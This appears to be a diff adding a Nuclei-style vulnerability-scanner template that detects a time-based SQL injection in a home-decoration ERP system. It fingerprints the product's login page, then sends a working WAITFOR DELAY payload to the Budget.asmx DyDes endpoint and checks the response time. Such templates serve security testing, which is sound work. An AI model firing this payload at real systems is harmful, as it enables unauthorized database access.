@@ -1,0 +1,43 @@
+id: poc-yaml-znfit-erp-ms-dydes-sqli
+info:
+  name: 家装ERP管理系统 DyDes SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL Injection vulnerability in 家装ERP管理系统 by exploiting the DyDes endpoint.
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/main/login.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "上海装盟信息科技有限公司"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/WEB_SERVICE/Budget.asmx/DyDes?code=';WAITFOR+DELAY+'0:0:{{t1}}'--&info=string"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "true"
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
